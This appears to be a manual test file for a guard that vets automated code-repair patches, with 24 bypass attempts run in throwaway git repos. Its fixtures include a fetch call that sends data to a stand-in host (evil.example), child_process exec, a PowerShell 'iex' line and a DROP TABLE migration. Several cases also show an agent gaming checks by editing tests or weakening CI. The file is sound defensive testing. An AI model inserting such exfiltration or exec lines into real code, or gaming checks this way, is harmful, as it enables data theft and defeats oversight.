// Bypass-attempt tests for guard.mjs (manual: `node .github/autorepair/test-guard.mjs`). Not wired into CI on purpose (phase 0 must not change CI).
// Builds throwaway git repos in a temp dir.
import fs from 'node:fs';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import os from 'node:os';
import { guard } from './guard.mjs';

const ROOT = fs.mkdtempSync(path.join(process.env.OZK_PROBE_DIR || os.tmpdir(), 'ozk-guard-test-'));   // throwaway repos; nothing outside is touched
const sh = (cwd, cmd, ...a) => { const r = spawnSync(cmd, a, { cwd, encoding: 'utf8' }); if (r.status) throw new Error(cmd + ' ' + a.join(' ') + ': ' + r.stderr); return r.stdout; };
const W = (d, f, s) => { fs.mkdirSync(path.dirname(path.join(d, f)), { recursive: true }); fs.writeFileSync(path.join(d, f), s); };
let n = 0, pass = 0;
function repo() {
  const d = path.join(ROOT, 'r' + (++n)); fs.mkdirSync(d, { recursive: true });
  sh(d, 'git', 'init', '-q', '-b', 'main');
  W(d, 'src/carton.js', 'export const total = (p, c) => Math.round(p * 10 * 100) / 100;\n');
  W(d, 'src/app.js', 'export const x = 1;\n');
  W(d, 'src/config.js', 'export const URL = "https://example.supabase.co";\n');
  W(d, 'test/carton.test.js', 'assert.equal(total(286,1),286)\n');
  W(d, 'scripts/run-checks.mjs', 'process.exit(run())\n');
  W(d, 'package.json', '{"scripts":{"check":"node scripts/run-checks.mjs"}}\n');
  W(d, '.github/workflows/check.yml', 'name: ci\n');
  W(d, 'supabase/migrations/0001.sql', 'select 1;\n');
  W(d, 'tools/sync.ps1', '# prod\n');
  W(d, '.gitattributes', '* text=auto\n');
  sh(d, 'git', '-c', 'user.name=t', '-c', 'user.email=t@invalid', 'add', '-A');
  sh(d, 'git', '-c', 'user.name=t', '-c', 'user.email=t@invalid', 'commit', '-qm', 'base');
  return d;
}
function expect(name, mutate, wantOk, wantMatch) {
  const d = repo(); mutate(d);
  let r; try { r = guard(d, 'HEAD'); } catch (e) { r = { ok: false, violations: ['guard_error:' + e.message.split('\n')[0].slice(0, 120)] }; }   // same fail-closed rule as the CLI
  const good = r.ok === wantOk && (!wantMatch || r.violations.some((x) => wantMatch.test(x)));
  if (good) pass++;
  console.log(`${good ? '✅' : '❌'} ${name} → ok=${r.ok}${r.violations.length ? ' ' + JSON.stringify(r.violations.slice(0, 3)) : ''}`);
}
const fix = (d) => W(d, 'src/carton.js', 'export const total = (p, c) => Math.round(p * c * 100) / 100;\n');

expect('G01 legitimate one-line fix in src/', fix, true);
expect('G02 edit a test to match the bug', (d) => { fix(d); W(d, 'test/carton.test.js', 'assert.equal(total(286,1),2860)\n'); }, false, /path_not_allowlisted:test\//);
expect('G03 weaken CI command script', (d) => { fix(d); W(d, 'scripts/run-checks.mjs', 'process.exit(0)\n'); }, false, /scripts\/run-checks/);
expect('G04 change package.json test command', (d) => W(d, 'package.json', '{"scripts":{"check":"true"}}\n'), false, /package\.json/);
expect('G05 edit .github/workflows', (d) => W(d, '.github/workflows/check.yml', 'name: ci\non: {}\n'), false, /\.github/);
expect('G06 add supabase migration', (d) => W(d, 'supabase/migrations/0002.sql', 'drop table x;\n'), false, /supabase/);
expect('G07 edit production PowerShell', (d) => W(d, 'tools/sync.ps1', '# prod\niex $x\n'), false, /tools\/sync\.ps1/);
expect('G08 add symlink inside src/', (d) => fs.symlinkSync('../tools/sync.ps1', path.join(d, 'src/link.js')), false, /status_not_allowed:A|mode_not_allowed:120000/);
expect('G09 chmod +x on src file', (d) => { fix(d); fs.chmodSync(path.join(d, 'src/carton.js'), 0o755); }, false, /mode_not_allowed:100755/);
expect('G10 move tools/sync.ps1 into src/', (d) => { fs.renameSync(path.join(d, 'tools/sync.ps1'), path.join(d, 'src/sync.js')); }, false, /status_not_allowed:D:tools|path_not_allowlisted:tools/);
expect('G11 delete a src file', (d) => fs.unlinkSync(path.join(d, 'src/app.js')), false, /status_not_allowed:D/);
expect('G12 add a new file in src/ (phase 1)', (d) => W(d, 'src/new.js', 'export {}\n'), false, /status_not_allowed:A/);
expect('G13 add Telegram-token-shaped secret', (d) => W(d, 'src/app.js', 'export const t = "123456789:' + 'A'.repeat(35) + '";\n'), false, /secret_pattern/);
expect('G14 add new external URL (exfil)', (d) => W(d, 'src/app.js', 'fetch("https://evil.example/c?d="+1)\n'), false, /new_external_url/);
expect('G15 oversized patch (>200 lines)', (d) => W(d, 'src/app.js', Array.from({ length: 250 }, (_, i) => `export const v${i} = ${i};`).join('\n') + '\n'), false, /too_many_lines/);
expect('G16 binary content in src/*.js', (d) => fs.writeFileSync(path.join(d, 'src/app.js'), Buffer.from([0, 1, 2, 0, 255, 0])), false, /binary_change/);
expect('G17 edit sensitive src/config.js', (d) => W(d, 'src/config.js', 'export const URL = "x";\n'), false, /path_denied:src\/config\.js/);
// macOS FS is case-insensitive, so inject the case-variant path straight into the git index (what Linux CI would see)
expect('G18 case-variant path Src/app.js', (d) => {
  const blob = spawnSync('git', ['hash-object', '-w', '--stdin'], { cwd: d, input: 'x\n', encoding: 'utf8' }).stdout.trim();
  sh(d, 'git', 'update-index', '--add', '--cacheinfo', `100644,${blob},Src/app.js`);
}, false, /path_not_allowlisted:Src|guard_error/);
expect('G19 edit .gitattributes', (d) => W(d, '.gitattributes', '* -text\n'), false, /\.gitattributes/);
expect('G20 empty patch', () => {}, false, /empty_patch/);
expect('G21 add untracked test file', (d) => { fix(d); W(d, 'test/zz.test.js', 'x\n'); }, false, /test\/zz/);
expect('G22 add eval/child_process', (d) => W(d, 'src/app.js', 'require("child_process").exec(x)\n'), false, /dangerous_code/);
expect('G23 >5 files in src/', (d) => { for (const f of ['a', 'b', 'c', 'd', 'e', 'f']) W(d, `src/${f}.js`, 'x\n'); }, false, /too_many_files|status_not_allowed:A/);
expect('G24 non-ASCII lookalike path', (d) => W(d, 'src/аpp.js', 'x\n'), false, /bad_path|status_not_allowed/);
console.log(`---- ${pass}/${n} guard tests passed`);
process.exit(pass === n ? 0 : 1);
